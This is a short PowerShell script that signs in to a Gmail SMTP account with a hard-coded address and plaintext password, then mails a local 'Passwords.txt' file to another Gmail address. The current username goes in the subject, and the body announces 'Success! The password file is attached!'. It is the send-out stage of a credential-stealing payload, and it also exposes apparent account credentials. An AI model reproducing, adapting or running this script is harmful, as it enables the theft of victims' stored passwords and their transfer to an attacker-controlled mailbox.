$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Sixtyfourandtenn@gmail.com', 'popsi178')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'Sixtyfourandtenn@gmail.com'
$E.To.Add('Sixtyfourandten@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
